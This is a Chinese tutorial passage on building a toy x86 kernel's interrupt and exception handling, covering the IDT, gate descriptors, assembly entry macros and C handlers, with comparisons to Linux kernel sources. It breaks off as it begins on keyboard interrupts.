其中对1、2行完成了中断函数的注册（覆盖了原始的除0异常函数），接着就是一个除0异常，我们在interrupt函数处下了断点 这样每次除0异常都会调用interrupt函数 移除所有断点，系统就一直死循环跑 程序一直打印.说明iret返回的地址并不是中断发生时后的地址，而是引发异常代码开始的地址，即除0操作的地址 大意描述为：eip = &amp;div_0，同时我们的操作并没有修改相关寄存器的值，所以这个异常会被一直引发下去。 目前这个是我们自己注册的系统调用，你是否想过最开始int 0x10的BIOS系统调用是怎么样的？ 这里有bochs实模式下的内存布局情况 起始地址 结束地址 大小 用途 0x000 0x3FF 1KB 中断向量表 0x400 0x4FF 256B BIOS 数据区 0x500 0x7BFF 29.75 KB 可用区域 0x7C00 0x7DFF 512B MBR 加载区域 0x7E00 0x9FBFF 607.6KB 可用区域 0x9FC00 0x9FFFF 1KB 扩展 BIOS 数据区 0xA0000 0xAFFFF 64KB 用于彩色显示适配器 0xB0000 0xB7FFF 32KB 用于黑白显示适配器 0xB8000 0xBFFFF 32KB 用于文本显示适配器 0xC0000 0xC7FFF 32KB 显示适配器 BIOS 0xC8000 0xEFFFF 160KB 映射内存 0xF0000 0xFFFEF 64KB-16B 系统 BIOS 0xFFFF0 0xFFFFF 16B 系统 BIOS 入口地址 再次回到Linux系统调用 虽然我的内核版本是Linux ubuntu 5.4.0-100-generic #113~18.04.1-Ubuntu，但是这里用v2.6.3的源代码说明原理 /arch/i386/kernel/entry.S 1234567891011121314151617181920212223ENTRY(system_call) pushl %eax # save orig_eax SAVE_ALL GET_THREAD_INFO(%ebp) cmpl $(nr_syscalls), %eax jae syscall_badsys # system call tracing in operation testb $_TIF_SYSCALL_TRACE,TI_FLAGS(%ebp) jnz syscall_trace_entrysyscall_call: call *sys_call_table(,%eax,4) movl %eax,EAX(%esp) # store the return valuesyscall_exit: cli # make sure we don&#x27;t miss an interrupt # setting need_resched or sigpending # between sampling and the iret movl TI_FLAGS(%ebp), %ecx testw $_TIF_ALLWORK_MASK, %cx # current-&gt;work jne syscall_exit_workrestore_all: RESTORE_ALL............ 这里就体现了demo工程与实际工程的不同 push eax到栈 保存一些相关的值/arch/alpha/kernel/entry.S 使用EBP来保存当前线程的信息 根据EAX的值选择适当的系统调用 /arch/um/kernel/sys_call_table.c 12345678910111213141516171819202122232425262728293031syscall_handler_t *sys_call_table[] = &#123; [ __NR_restart_syscall ] = sys_restart_syscall, [ __NR_exit ] = sys_exit, [ __NR_fork ] = sys_fork, [ __NR_read ] = (syscall_handler_t *) sys_read, [ __NR_write ] = (syscall_handler_t *) sys_write, /* These three are declared differently in asm/unistd.h */ [ __NR_open ] = (syscall_handler_t *) sys_open, [ __NR_close ] = (syscall_handler_t *) sys_close, [ __NR_waitpid ] = (syscall_handler_t *) sys_waitpid, [ __NR_creat ] = sys_creat, [ __NR_link ] = sys_link, [ __NR_unlink ] = sys_unlink, /* declared differently in kern_util.h */ [ __NR_execve ] = (syscall_handler_t *) sys_execve, [ __NR_chdir ] = sys_chdir, [ __NR_time ] = um_time, [ __NR_mknod ] = sys_mknod, [ __NR_chmod ] = sys_chmod, [ __NR_lchown ] = sys_lchown16, [ __NR_break ] = sys_ni_syscall, [ __NR_oldstat ] = sys_stat, [ __NR_lseek ] = (syscall_handler_t *) sys_lseek, [ __NR_getpid ] = sys_getpid, [ __NR_mount ] = um_mount, [ __NR_umount ] = sys_oldumount, [ __NR_setuid ] = sys_setuid16, ...... ...... 这里以sys_write举例说明 /fs/read_write.c 1234567891011121314asmlinkage ssize_t sys_write(unsigned int fd, const char __user * buf, size_t count)&#123; struct file *file; ssize_t ret = -EBADF; int fput_needed; file = fget_light(fd, &amp;fput_needed); if (file) &#123; ret = vfs_write(file, buf, count, &amp;file-&gt;f_pos); fput_light(file, fput_needed); &#125; return ret;&#125; 具体链接情况 这样就实现了一个系统调用 中断描述符 引发中断的方式 外中断 异常 软中断 外中断就是由外部中断控制器通知 CPU 需要执行的，CPU 在当前指令执行完成之后，回去检测是否有中断产生，如果有，并且 IF 位有效，也就是允许中断，那么就会执行中断处理函数，这种方式直接的体验就是，CPU 可以在任意两个指令间插入一个中断函数调用，中断函数调用与普通函数调用稍有区别，在调用时栈中多压了一些数据，在中断返回时，会弹出； 异常和软中断统称为内中断，也就是这个中断时 CPU 和 软件内部产生的，与外部硬件无关； 异常是 CPU 在执行过程中，执行不下去了，引发的中断调用，比如 除零异常，缺页异常，一般保护错误，有一些异常在处理后程序是可以继续执行的，比如缺页异常，而有一些异常就不行了，比如一般保护，这种情况下一般是软件访问了不该访问的内存或者寄存器，自己没有权限，于是CPU会调用一般保护异常函数，这个函数中，一般会终止该进程的执行，试图访问自己没有权限的内容，应该是危险的程序，可能是恶意程序，或者是程序有漏洞； 软中断，可以认为是应用程序和操作系统沟通的一种方式，应用程序运行在较低的特权级，一般来说没有直接访问硬件的权限，当应用程序想要访问硬件的时候，比如典型的读写文件，就需要调用系统调用，系统调用就是用软中断实现的，也就是应用程序调用软中断函数来请求操作系统，以访问硬件，访问硬件的函数是操作系统实现的，于是被认为是安全的，就这样。 从Linux源代码来看，当我们需要实现许多系统调用的时候，可以把所有的系统调用函数的地址写到一张函数表上，实现一个和linux差不多的系统调用表 对于每一个中断，我们需要一个中断描述符表(interrupte descriptor table. IDT) 在/arch/i386/boot/setup.S初始化了全局描述符和中断描述符 123456789101112131415161718192021222324252627#endif /* CONFIG_X86_VOYAGER */# set up gdt and idt lidt idt_48 # load idt with 0,0 xorl %eax, %eax # Compute gdt_base movw %ds, %ax # (Convert %ds:gdt to a linear ptr) shll $4, %eax addl $gdt, %eax movl %eax, (gdt_48+2) lgdt gdt_48 # load gdt with whatever is # appropriate# make sure any possible coprocessor is properly reset.. xorw %ax, %ax outb %al, $0xf0 call delay outb %al, $0xf1 call delay# well, that went ok, I hope. Now we mask all interrupts - the rest# is done in init_IRQ(). movb $0xFF, %al # mask all interrupts for now outb %al, $0xA1 call delay movb $0xFB, %al # mask all irq&#x27;s but irq2 which outb %al, $0x21 # is cascaded lgdt：加载全局描述符 lidt：加载中断描述符 中断描述符结构体 /arch/x86/kernel/idt.c 12345678910struct gate_struct &#123; u16 offset_low; u16 segment; struct idt_bits bits; u16 offset_middle;#ifdef CONFIG_X86_64 u32 offset_high; u32 reserved;#endif&#125; __attribute__((packed)); 至于最下面的offset_high和reserved都是留给x86_64的，所以我们可以定义如下结构体 src/include/xsys/interrupt.h 12345678910111213141516171819202122#ifndef XSYS_INTERRUPT_H#define XSYS_INTERRUPT_H#include &lt;xsys/types.h&gt;#define IDT_SIZE 256typedef struct gate_t&#123; u16 offset0; // 段内偏移 0 ~ 15 位 u16 selector; // 代码段选择子 u8 reserved; // 保留不用 u8 type : 4; // 任务门/中断门/陷阱门 u8 segment : 1; // segment = 0 表示系统段 u8 DPL : 2; // 使用 int 指令访问的最低权限 u8 present : 1; // 是否有效 u16 offset1; // 段内偏移 16 ~ 31 位&#125; _packed gate_t;void interrupt_init();#endif 之后就是初始化idt src/kernel/interrupt.c 12345678910111213141516171819202122void interrupt_init()&#123; for (size_t i = 0; i &lt; IDT_SIZE; i++) &#123; gate_t *gate = &amp;idt[i]; gate-&gt;offset0 = (u32)interrupt_handler &amp; 0xffff; gate-&gt;offset1 = ((u32)interrupt_handler &gt;&gt; 16) &amp; 0xffff; gate-&gt;selector = 1 &lt;&lt; 3; // 代码段 gate-&gt;reserved = 0; // 保留不用 gate-&gt;type = 0b1110; // 中断门 gate-&gt;segment = 0; // 系统段 gate-&gt;DPL = 0; // 内核态 gate-&gt;present = 1; // 有效 &#125; idt_ptr.base = (u32)idt; idt_ptr.limit = sizeof(idt) - 1; BMB; asm volatile(&quot;lidt idt_ptr\\n&quot;);&#125; gate-&gt;type 0b0101 - 任务门 (Task Gate)：很复杂，而且很低效 x64 就去掉了这种门 0b1110 - 中断门 (Interrupt Gate) IF 位自动置为 0 0b1111 - 陷阱门 (Trap Gate) 同时模仿linux，有中断处理函数入口的程序 src/kernel/handler.asm 1234567891011121314151617181920[bits 32]; 中断处理函数入口 section .textextern printkglobal interrupt_handlerinterrupt_handler: xchg bx, bx push message call printk add esp, 4 xchg bx, bx iretsection .datamessage: db &quot;interrput test&quot;,10,0 我们可以创建255个系统中断，即255个IDT，使用bochs调试一下 而idt的地址：0x10900就是interrupt_handler 最后也被成功执行了 参考 https://www.cnblogs.com/LittleHann/p/3871630.html https://en.wikipedia.org/wiki/Interrupt_vector_table 操作系统实现-异常 简单实现 异常 故障 陷阱 终止 故障 Fault 这种错误是可以被修复的一种类型，属于最轻的一种异常； 陷阱 Trap 此异常通常用于调试 终止 Abort 是最严重的异常类型，一旦出现由于 错误无法修复，程序将无法继续运行 每个一场都需要一个中断，所以有30个中断，用到汇编宏(marco)去处理 src/kernel/handler.asm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159[bits 32]; 中断处理函数入口 extern handler_tablesection .text%macro INTERRUPT_HANDLER 2interrupt_handler_%1: xchg bx, bx%ifn %2 push 0x20222202%endif push %1; 压入中断向量，跳转到中断入口 jmp interrupt_entry%endmacrointerrupt_entry: ; 保存上文寄存器信息 push ds push es push fs push gs pusha ; 找到前面 push %1 压入的 中断向量 mov eax, [esp + 12 * 4] ; 向中断处理函数传递参数 push eax ; 调用中断处理函数，handler_table 中存储了中断处理函数的指针 call [handler_table + eax * 4] ; 对应 push eax，调用结束恢复栈 add esp, 4 ; 恢复下文寄存器信息 popa pop gs pop fs pop es pop ds ; 对应 push %1 ; 对应 error code 或 push magic add esp, 8 iretINTERRUPT_HANDLER 0x00, 0; divide by zeroINTERRUPT_HANDLER 0x01, 0; debugINTERRUPT_HANDLER 0x02, 0; non maskable interruptINTERRUPT_HANDLER 0x03, 0; breakpointINTERRUPT_HANDLER 0x04, 0; overflowINTERRUPT_HANDLER 0x05, 0; bound range exceededINTERRUPT_HANDLER 0x06, 0; invalid opcodeINTERRUPT_HANDLER 0x07, 0; device not avilableINTERRUPT_HANDLER 0x08, 1; double faultINTERRUPT_HANDLER 0x09, 0; coprocessor segment overrunINTERRUPT_HANDLER 0x0a, 1; invalid TSSINTERRUPT_HANDLER 0x0b, 1; segment not presentINTERRUPT_HANDLER 0x0c, 1; stack segment faultINTERRUPT_HANDLER 0x0d, 1; general protection faultINTERRUPT_HANDLER 0x0e, 1; page faultINTERRUPT_HANDLER 0x0f, 0; reservedINTERRUPT_HANDLER 0x10, 0; x87 floating point exceptionINTERRUPT_HANDLER 0x11, 1; alignment checkINTERRUPT_HANDLER 0x12, 0; machine checkINTERRUPT_HANDLER 0x13, 0; SIMD Floating - Point ExceptionINTERRUPT_HANDLER 0x14, 0; Virtualization ExceptionINTERRUPT_HANDLER 0x15, 1; Control Protection ExceptionINTERRUPT_HANDLER 0x16, 0; reservedINTERRUPT_HANDLER 0x17, 0; reservedINTERRUPT_HANDLER 0x18, 0; reservedINTERRUPT_HANDLER 0x19, 0; reservedINTERRUPT_HANDLER 0x1a, 0; reservedINTERRUPT_HANDLER 0x1b, 0; reservedINTERRUPT_HANDLER 0x1c, 0; reservedINTERRUPT_HANDLER 0x1d, 0; reservedINTERRUPT_HANDLER 0x1e, 0; reservedINTERRUPT_HANDLER 0x1f, 0; reservedINTERRUPT_HANDLER 0x20, 0; clock 时钟中断INTERRUPT_HANDLER 0x21, 0INTERRUPT_HANDLER 0x22, 0INTERRUPT_HANDLER 0x23, 0INTERRUPT_HANDLER 0x24, 0INTERRUPT_HANDLER 0x25, 0INTERRUPT_HANDLER 0x26, 0INTERRUPT_HANDLER 0x27, 0INTERRUPT_HANDLER 0x28, 0INTERRUPT_HANDLER 0x29, 0INTERRUPT_HANDLER 0x2a, 0INTERRUPT_HANDLER 0x2b, 0INTERRUPT_HANDLER 0x2c, 0INTERRUPT_HANDLER 0x2d, 0INTERRUPT_HANDLER 0x2e, 0INTERRUPT_HANDLER 0x2f, 0; 下面的数组记录了每个中断入口函数的指针section .dataglobal handler_entry_tablehandler_entry_table: dd interrupt_handler_0x00 dd interrupt_handler_0x01 dd interrupt_handler_0x02 dd interrupt_handler_0x03 dd interrupt_handler_0x04 dd interrupt_handler_0x05 dd interrupt_handler_0x06 dd interrupt_handler_0x07 dd interrupt_handler_0x08 dd interrupt_handler_0x09 dd interrupt_handler_0x0a dd interrupt_handler_0x0b dd interrupt_handler_0x0c dd interrupt_handler_0x0d dd interrupt_handler_0x0e dd interrupt_handler_0x0f dd interrupt_handler_0x10 dd interrupt_handler_0x11 dd interrupt_handler_0x12 dd interrupt_handler_0x13 dd interrupt_handler_0x14 dd interrupt_handler_0x15 dd interrupt_handler_0x16 dd interrupt_handler_0x17 dd interrupt_handler_0x18 dd interrupt_handler_0x19 dd interrupt_handler_0x1a dd interrupt_handler_0x1b dd interrupt_handler_0x1c dd interrupt_handler_0x1d dd interrupt_handler_0x1e dd interrupt_handler_0x1f dd interrupt_handler_0x20 dd interrupt_handler_0x21 dd interrupt_handler_0x22 dd interrupt_handler_0x23 dd interrupt_handler_0x24 dd interrupt_handler_0x25 dd interrupt_handler_0x26 dd interrupt_handler_0x27 dd interrupt_handler_0x28 dd interrupt_handler_0x29 dd interrupt_handler_0x2a dd interrupt_handler_0x2b dd interrupt_handler_0x2c dd interrupt_handler_0x2d dd interrupt_handler_0x2e dd interrupt_handler_0x2f src/include/xsys/interrupt.h 1234567891011121314151617181920212223#ifndef XSYS_INTERRUPT_H#define XSYS_INTERRUPT_H#include &lt;xsys/types.h&gt;#define IDT_SIZE 256typedef struct gate_t&#123; u16 offset0; // 段内偏移 0 ~ 15 位 u16 selector; // 代码段选择子 u8 reserved; // 保留不用 u8 type : 4; // 任务门/中断门/陷阱门 u8 segment : 1; // segment = 0 表示系统段 u8 DPL : 2; // 使用 int 指令访问的最低权限 u8 present : 1; // 是否有效 u16 offset1; // 段内偏移 16 ~ 31 位&#125; _packed gate_t;typedef void *handler_t; // 中断处理函数void interrupt_init();#endif src/kernel/interrupt.c 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#include &lt;xsys/interrupt.h&gt;#include &lt;xsys/global.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/printk.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/assert.h&gt;#define LOGK(fmt, args...) DEBUGK(fmt, ##args)// #define LOGK(fmt, args...)#define ENTRY_SIZE 0x30#define PIC_M_CTRL 0x20 // 主片的控制端口#define PIC_M_DATA 0x21 // 主片的数据端口#define PIC_S_CTRL 0xa0 // 从片的控制端口#define PIC_S_DATA 0xa1 // 从片的数据端口#define PIC_EOI 0x20 // 通知中断控制器中断结束gate_t idt[IDT_SIZE];pointer_t idt_ptr;handler_t handler_table[IDT_SIZE];extern handler_t handler_entry_table[ENTRY_SIZE];static char *messages[] = &#123; &quot;#DE Divide Error\\0&quot;, &quot;#DB RESERVED\\0&quot;, &quot;-- NMI Interrupt\\0&quot;, &quot;#BP Breakpoint\\0&quot;, &quot;#OF Overflow\\0&quot;, &quot;#BR BOUND Range Exceeded\\0&quot;, &quot;#UD Invalid Opcode (Undefined Opcode)\\0&quot;, &quot;#NM Device Not Available (No Math Coprocessor)\\0&quot;, &quot;#DF Double Fault\\0&quot;, &quot; Coprocessor Segment Overrun (reserved)\\0&quot;, &quot;#TS Invalid TSS\\0&quot;, &quot;#NP Segment Not Present\\0&quot;, &quot;#SS Stack-Segment Fault\\0&quot;, &quot;#GP General Protection\\0&quot;, &quot;#PF Page Fault\\0&quot;, &quot;-- (Intel reserved. Do not use.)\\0&quot;, &quot;#MF x87 FPU Floating-Point Error (Math Fault)\\0&quot;, &quot;#AC Alignment Check\\0&quot;, &quot;#MC Machine Check\\0&quot;, &quot;#XF SIMD Floating-Point Exception\\0&quot;, &quot;#VE Virtualization Exception\\0&quot;, &quot;#CP Control Protection Exception\\0&quot;,&#125;;void exception_handler(int vector)&#123; char *message = NULL; if (vector &lt; 22) &#123; message = messages[vector]; &#125; else &#123; message = messages[15]; &#125; printk(&quot;\\nEXCEPTION : %s \\n&quot;, messages[vector]); while(true);&#125;// 初始化中断描述符，和中断处理函数数组void interrupt_init()&#123; for (size_t i = 0; i &lt; ENTRY_SIZE; i++) &#123; gate_t *gate = &amp;idt[i]; handler_t handler = handler_entry_table[i]; gate-&gt;offset0 = (u32)handler &amp; 0xffff; gate-&gt;offset1 = ((u32)handler &gt;&gt; 16) &amp; 0xffff; gate-&gt;selector = 1 &lt;&lt; 3; // 代码段 gate-&gt;reserved = 0; // 保留不用 gate-&gt;type = 0b1110; // 中断门 gate-&gt;segment = 0; // 系统段 gate-&gt;DPL = 0; // 内核态 gate-&gt;present = 1; // 有效 &#125; for (size_t i = 0; i &lt; 0x20; i++) &#123; handler_table[i] = exception_handler; &#125; idt_ptr.base = (u32)idt; idt_ptr.limit = sizeof(idt) - 1; asm volatile(&quot;lidt idt_ptr\\n&quot;);&#125; 在start.asm中写一个int 0x80超出范围调用 src/kernel/start.asm 123456789[bits 32]extern kernel_initglobal _start_start: call kernel_init int 0x80 jmp $ 可以看到已经把参数都压进去了，根据判断启动了第13号默认调用 再是一个除0异常 src/kernel/start.asm 12345678910[bits 32]extern kernel_initglobal _start_start: call kernel_init mov bx, 0 div bx jmp $ 异常列表 编号 名称 类型 助记符 错误码 0 (0x0) 除零错误 故障 #DE 无 1 (0x1) 调试 故障/陷阱 #DB 无 2 (0x2) 不可屏蔽中断 中断 - 无 3 (0x3) 断点 陷阱 #BP 无 4 (0x4) 溢出 陷阱 #OF 无 5 (0x5) 越界 故障 #BR 无 6 (0x6) 指令无效 故障 #UD 无 7 (0x7) 设备不可用 故障 #NM 无 8 (0x8) 双重错误 终止 #DF 有 (Zero) 9 (0x9) 协处理器段超限 故障 - 无 10 (0xA) 无效任务状态段 故障 #TS 有 11 (0xB) 段无效 故障 #NP 有 12 (0xC) 栈段错误 故障 #SS 有 13 (0xD) 一般性保护异常 故障 #GP 有 14 (0xE) 缺页错误 故障 #PF 有 15 (0xF) 保留 - - 无 16 (0x10) 浮点异常 故障 #MF 无 17 (0x11) 对齐检测 故障 #AC 有 18 (0x12) 机器检测 终止 #MC 无 19 (0x13) SIMD 浮点异常 故障 #XM/#XF 无 20 (0x14) 虚拟化异常 故障 #VE 无 21 (0x15) 控制保护异常 故障 #CP 有 22-31 (0x16-0x1f) 保留 - - 无 Linux是怎样做到的 官方说明：https://linux-kernel-labs.github.io/refs/heads/master/lectures/interrupts.html Below we can find Linux IRQ vector layout. The first 32 entries are reserved for exceptions, vector 128 is used for syscall interface and the rest are used mostly for hardware interrupts handlers. 这是linux对不同中断编号的分类 在复习下之前的操作系统实现-系统中断的内容，我们在这篇博客里面是实现的异常处理，再Linux上对应的编号是0~31 /arch/x86/include/asm/irq_vectors.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114/* SPDX-License-Identifier: GPL-2.0 */#ifndef _ASM_X86_IRQ_VECTORS_H#define _ASM_X86_IRQ_VECTORS_H#include &lt;linux/threads.h&gt;/* * Linux IRQ vector layout. * * There are 256 IDT entries (per CPU - each entry is 8 bytes) which can * be defined by Linux. They are used as a jump table by the CPU when a * given vector is triggered - by a CPU-external, CPU-internal or * software-triggered event. * * Linux sets the kernel code address each entry jumps to early during * bootup, and never changes them. This is the general layout of the * IDT entries: * * Vectors 0 ... 31 : system traps and exceptions - hardcoded events * Vectors 32 ... 127 : device interrupts * Vector 128 : legacy int80 syscall interface * Vectors 129 ... LOCAL_TIMER_VECTOR-1 * Vectors LOCAL_TIMER_VECTOR ... 255 : special interrupts..... *//* This is used as an interrupt vector when programming the APIC. */#define NMI_VECTOR 0x02/* * IDT vectors usable for external interrupt sources start at 0x20. * (0x80 is the syscall vector, 0x30-0x3f are for ISA) */#define FIRST_EXTERNAL_VECTOR 0x20/* * Reserve the lowest usable vector (and hence lowest priority) 0x20 for * triggering cleanup after irq migration. 0x21-0x2f will still be used * for device interrupts. */#define IRQ_MOVE_CLEANUP_VECTOR FIRST_EXTERNAL_VECTOR#define IA32_SYSCALL_VECTOR 0x80/* * Vectors 0x30-0x3f are used for ISA interrupts. * round up to the next 16-vector boundary */#define ISA_IRQ_VECTOR(irq) (((FIRST_EXTERNAL_VECTOR + 16) &amp; ~15) + irq)/* * Special IRQ vectors used by the SMP architecture, 0xf0-0xff * * some of the following vectors are &#x27;rare&#x27;, they are merged * into a single vector (CALL_FUNCTION_VECTOR) to save vector space. * TLB, reschedule and local APIC vectors are performance-critical. */#define SPURIOUS_APIC_VECTOR 0xff/* * Sanity check */#if ((SPURIOUS_APIC_VECTOR &amp; 0x0F) != 0x0F)# error SPURIOUS_APIC_VECTOR definition error#endif#define ERROR_APIC_VECTOR 0xfe#define RESCHEDULE_VECTOR 0xfd#define CALL_FUNCTION_VECTOR 0xfc#define CALL_FUNCTION_SINGLE_VECTOR 0xfb#define THERMAL_APIC_VECTOR 0xfa#define THRESHOLD_APIC_VECTOR 0xf9#define REBOOT_VECTOR 0xf8/* * Generic system vector for platform specific use */#define X86_PLATFORM_IPI_VECTOR 0xf7/* * IRQ work vector: */............/* * Size the maximum number of interrupts. * * If the irq_desc[] array has a sparse layout, we can size things * generously - it scales up linearly with the maximum number of CPUs, * and the maximum number of IO-APICs, whichever is higher. * * In other cases we size more conservatively, to not create too large * static arrays. */#define NR_IRQS_LEGACY 16#define CPU_VECTOR_LIMIT (64 * NR_CPUS)#define IO_APIC_VECTOR_LIMIT (32 * MAX_IO_APICS)#if defined(CONFIG_X86_IO_APIC) &amp;&amp; defined(CONFIG_PCI_MSI)#define NR_IRQS \\ (CPU_VECTOR_LIMIT &gt; IO_APIC_VECTOR_LIMIT ? \\ (NR_VECTORS + CPU_VECTOR_LIMIT) : \\ (NR_VECTORS + IO_APIC_VECTOR_LIMIT))#elif defined(CONFIG_X86_IO_APIC)#define NR_IRQS (NR_VECTORS + IO_APIC_VECTOR_LIMIT)#elif defined(CONFIG_PCI_MSI)#define NR_IRQS (NR_VECTORS + CPU_VECTOR_LIMIT)#else#define NR_IRQS NR_IRQS_LEGACY#endif#endif /* _ASM_X86_IRQ_VECTORS_H */ 接着就是三种门： On x86 an IDT entry has 8 bytes and it is named gate. There can be 3 types of gates: interrupt gate, holds the address of an interrupt or exception handler. Jumping to the handler disables maskable interrupts (IF flag is cleared). trap gates, similar to an interrupt gate but it does not disable maskable interrupts while jumping to interrupt/exception handler. task gates (not used in Linux) 这个gate就是中断描述符的结构体，具体门的有三种：中断门、陷阱门、任务门(没有再Linux上使用) 同时文档也向我们说明了IDT_Entry（即：门）的属性 Let’s have a look at several fields of an IDT entry: segment selector, index into GDT/LDT to find the start of the code segment where the interrupt handlers reside offset, offset inside the code segment T, represents the type of gate DPL, minimum privilege required for using the segments content. 要有一个段选择子，能够将从全局描述符表和和中断描述符表找到对应的内存和中断函数(imnterrupt handlers) 在代码段中的偏移 门类型的代表 使用该段信息的最小权限值 所以我们写除了代码： 1234567891011typedef struct gate_t&#123; u16 offset0; // 段内偏移 0 ~ 15 位 u16 selector; // 代码段选择子 u8 reserved; // 保留不用 u8 type : 4; // 任务门/中断门/陷阱门 u8 segment : 1; // segment = 0 表示系统段 u8 DPL : 2; // 使用 int 指令访问的最低权限 u8 present : 1; // 是否有效 u16 offset1; // 段内偏移 16 ~ 31 位&#125; _packed gate_t; 同时的Linux实现： /arch/x86/include/asm/desc_defs.h 12345678910struct gate_struct &#123; u16 offset_low; u16 segment; struct idt_bits bits; u16 offset_middle;#ifdef CONFIG_X86_64 u32 offset_high; u32 reserved;#endif&#125; __attribute__((packed)); 从上面得知我们需要对gate有初始化 所以写了 12345678910111213141516171819202122232425262728void interrupt_init()&#123; for (size_t i = 0; i &lt; ENTRY_SIZE; i++) &#123; gate_t *gate = &amp;idt[i]; handler_t handler = handler_entry_table[i]; gate-&gt;offset0 = (u32)handler &amp; 0xffff; gate-&gt;offset1 = ((u32)handler &gt;&gt; 16) &amp; 0xffff; gate-&gt;selector = 1 &lt;&lt; 3; // 代码段 gate-&gt;reserved = 0; // 保留不用 gate-&gt;type = 0b1110; // 中断门 gate-&gt;segment = 0; // 系统段 gate-&gt;DPL = 0; // 内核态 gate-&gt;present = 1; // 有效 &#125; for (size_t i = 0; i &lt; 0x20; i++) &#123; handler_table[i] = exception_handler; &#125; idt_ptr.base = (u32)idt; idt_ptr.limit = sizeof(idt) - 1; asm volatile(&quot;lidt idt_ptr\\n&quot;);&#125; 对应的Linux中有：（这也只是其中一种） /arch/x86/boot/compressed/idt_64.c 12345678910111213141516static void set_idt_entry(int vector, void (*handler)(void))&#123; unsigned long address = (unsigned long)handler; gate_desc entry; memset(&amp;entry, 0, sizeof(entry)); entry.offset_low = (u16)(address &amp; 0xffff); entry.segment = __KERNEL_CS; entry.bits.type = GATE_TRAP; entry.bits.p = 1; entry.offset_middle = (u16)((address &gt;&gt; 16) &amp; 0xffff); entry.offset_high = (u32)(address &gt;&gt; 32); memcpy(&amp;boot_idt[vector], &amp;entry, sizeof(entry));&#125; 还需要一个函数来帮助gate的段选择子找到相对应的系统调用号，这个函数被称为interrupt_handler 这里我们实现的是异常，所以是exception_handler 123456789101112131415void exception_handler(int vector)&#123; char *message = NULL; if (vector &lt; 22) &#123; message = messages[vector]; &#125; else &#123; message = messages[15]; &#125; printk(&quot;\\nEXCEPTION : %s \\n&quot;, messages[vector]); while(true);&#125; 同时我门在跳转的时候需要使用栈来保存相关信息，并且要记录系统调用号对应的函数地址，对于有的报错需要压入一些值到栈里面 As can be seen in the figure below, an interrupt pushes the EFLAGS register before saving the address of the interrupted instruction. Certain types of exceptions also cause an error code to be pushed on the stack to help debug the exception. CPU checks the current privilege level if need to change privilege level change stack with the one associated with new privilege save old stack information on the new stack save EFLAGS, CS, EIP on stack save error code on stack in case of an abort execute the kernel interrupt handler To resume the execution after an interrupt the following sequence is used (x86): pop the error code (in case of an abort) call IRET pops values from the stack and restore the following register: CS, EIP, EFLAGS if privilege level changed returns to the old stack and old privilege level 所以也有了handler.asm中的handler_entry_table那么长一串，以及 1234567891011121314151617181920212223242526272829303132interrupt_entry: ; 保存上文寄存器信息 push ds push es push fs push gs pusha ; 找到前面 push %1 压入的 中断向量 mov eax, [esp + 12 * 4] ; 向中断处理函数传递参数 push eax ; 调用中断处理函数，handler_table 中存储了中断处理函数的指针 call [handler_table + eax * 4] ; 对应 push eax，调用结束恢复栈 add esp, 4 ; 恢复下文寄存器信息 popa pop gs pop fs pop es pop ds ; 对应 push %1 ; 对应 error code 或 push magic add esp, 8 iret 同样的在Linux中也有，但是他的实现更加的复杂 不过仍然能找到/arch/x86/kernel/entry_32.S（其他版本可能实现地方不同，这是2.6内核版本的） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778.macro TRACE_IRQS_IRET#ifdef CONFIG_TRACE_IRQFLAGS testl $X86_EFLAGS_IF,PT_EFLAGS(%esp) # interrupts off? jz 1f TRACE_IRQS_ON1:#endif.endm....../* * User gs save/restore * * %gs is used for userland TLS and kernel only uses it for stack * canary which is required to be at %gs:20 by gcc. Read the comment * at the top of stackprotector.h for more info. * * Local labels 98 and 99 are used. */#ifdef CONFIG_X86_32_LAZY_GS /* unfortunately push/pop can&#x27;t be no-op */.macro PUSH_GS pushl_cfi $0.endm.macro POP_GS pop=0 addl $(4 + \\pop), %esp CFI_ADJUST_CFA_OFFSET -(4 + \\pop).endm.macro POP_GS_EX.endm /* all the rest are no-op */.macro PTGS_TO_GS.endm.macro PTGS_TO_GS_EX.endm.macro GS_TO_REG reg.endm.macro REG_TO_PTGS reg.endm.macro SET_KERNEL_GS reg.endm.......macro GS_TO_REG reg movl %gs, \\reg /*CFI_REGISTER gs, \\reg*/.endm.macro REG_TO_PTGS reg movl \\reg, PT_GS(%esp) /*CFI_REL_OFFSET gs, PT_GS*/.endm.macro SET_KERNEL_GS reg movl $(__KERNEL_STACK_CANARY), \\reg movl \\reg, %gs.endm#endif /* CONFIG_X86_32_LAZY_GS */.macro SAVE_ALL cld PUSH_GS pushl_cfi %fs /*CFI_REL_OFFSET fs, 0;*/ pushl_cfi %es /*CFI_REL_OFFSET es, 0;*/ pushl_cfi %ds /*CFI_REL_OFFSET ds, 0;*/ pushl_cfi %eax CFI_REL_OFFSET eax, 0 pushl_cfi %ebp CFI_REL_OFFSET ebp, 0.......macro RESTORE_INT_REGS popl_cfi %ebx...... 对应的64位：/arch/x86/kernel/entry_64.S 参考 https://linux-kernel-labs.github.io/refs/heads/master/lectures/interrupts.html https://lrita.github.io/2019/03/05/linux-interrupt-and-trap/ 操作系统实现-外中断 代码来源：https://github.com/StevenBaby/onix 相关课程：https://www.bilibili.com/video/BV1gR4y1u7or 感谢B站UP：踌躇月光 带来的相关代码和教程 up的原视频直接开始将源代码了，但是我操作系统没学好怎么办，赶紧查外中断是个啥 中断的种类有： 异常 外中断 软中断 UP的图总结的非常好 在上一篇我们实现的是异常，这里实现的是外中断，有了外中断我们就可以做一些输入了 比如： 键盘按下一个按钮（其实感兴趣的话不妨去了解了解TTY(TeleTypeWriter)） 键盘芯片通过数据总线向CPU传递信号，要求CPU暂停，从死循环跳出（中断），转到来处理这个按钮所出发的时间 CPU处理完成后返回原来的执行流 这里描绘一下8086PC机键盘处理过程 CPU一直在检测中断 键盘按下，发出终端扫描码0x1E，被I/O接口的0x60端口上 